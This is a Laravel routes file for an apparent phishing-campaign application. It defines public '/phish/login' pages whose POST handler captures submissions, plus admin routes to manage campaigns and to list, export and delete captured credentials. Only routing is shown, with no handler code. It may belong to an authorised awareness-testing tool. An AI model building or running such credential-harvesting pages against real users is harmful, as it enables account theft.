<?php
use App\Http\Controllers\ProfileController;
use App\Http\Controllers\AdminController;
use App\Http\Controllers\CampaignController;
use App\Http\Controllers\PhishController;
use App\Http\Controllers\Admin\PhishCredentialController;
use Illuminate\Support\Facades\Route;

Route::get('/', function () {
    return redirect('/login');
});

/* User Dashboard */
Route::get('/dashboard', function () {
    return view('dashboard');
})->middleware(['auth', 'verified'])->name('dashboard');

/* User Profile */
Route::middleware('auth')->group(function () {
    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');
});

/* Admin Routes */
Route::middleware(['auth', 'admin'])->group(function () {
    Route::delete(
    '/admin/credentials/{id}',
    [PhishCredentialController::class, 'destroy']
    )->name('admin.credentials.destroy');

    Route::get('/admin', [AdminController::class, 'index'])->name('admin.dashboard');
    Route::post('/admin/toggle/{id}', [AdminController::class, 'toggleAdmin'])->name('admin.toggle');

    /* Campaign CRUD */
    Route::get('/admin/campaigns', [CampaignController::class, 'index'])->name('campaigns.index');
    Route::get('/admin/campaigns/create', [CampaignController::class, 'create'])->name('campaigns.create');
    Route::post('/admin/campaigns', [CampaignController::class, 'store'])->name('campaigns.store');
    Route::delete('/admin/campaigns/{campaign}', [CampaignController::class, 'destroy'])->name('campaigns.destroy');

    /* Captured Credentials */
    Route::get('/admin/credentials', [PhishCredentialController::class, 'index'])
        ->name('admin.credentials');
    Route::get('/admin/credentials/export', [PhishCredentialController::class, 'export'])
    ->name('admin.credentials.export');


});

/* Phishing Pages */
Route::get('/phish/login', [PhishController::class, 'showLogin']);
Route::post('/phish/login', [PhishController::class, 'capture']);

require __DIR__.'/auth.php';
